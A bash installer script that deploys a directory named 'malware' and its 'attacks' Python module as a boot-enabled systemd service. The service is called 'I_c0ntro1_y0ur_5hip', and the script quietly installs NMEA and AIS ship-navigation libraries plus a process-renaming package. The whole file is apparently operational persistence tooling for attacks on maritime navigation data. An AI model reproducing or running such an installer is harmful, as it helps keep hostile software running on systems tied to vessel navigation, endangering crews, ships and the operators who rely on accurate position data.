#!/bin/bash

set -e

SERVICE_NAME="I_c0ntro1_y0ur_5hip"
INSTALL_DIR="/opt/$SERVICE_NAME"
BIN_PATH="/usr/local/bin/$SERVICE_NAME"
SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME.service"

# Step 1: Copy code to installation directory
sudo mkdir -p "$INSTALL_DIR"
sudo cp -r malware/* "$INSTALL_DIR"

# Step 2: Create virtual environment
sudo python3 -m venv "$INSTALL_DIR/venv"

# Step 3: Install dependencies silently
sudo "$INSTALL_DIR/venv/bin/pip" install --quiet --no-cache-dir aiohttp~=3.8 pynmea2~=1.18 pyais~=2.4 setproctitle

# Step 4: Create launch script
sudo tee "$BIN_PATH" > /dev/null <<EOF
#!/bin/bash
exec "$INSTALL_DIR/venv/bin/python" -m attacks
EOF

sudo chmod +x "$BIN_PATH"

# Step 5: Create systemd service
sudo tee "$SERVICE_FILE" > /dev/null <<EOF
[Unit]
Description=Attack Script Service
After=network.target

[Service]
Type=simple
ExecStart=$BIN_PATH
Restart=on-failure
User=$(whoami)
WorkingDirectory=$INSTALL_DIR

[Install]
WantedBy=multi-user.target
EOF

# Step 6: Reload systemd and start service
sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl enable --now "$SERVICE_NAME.service"
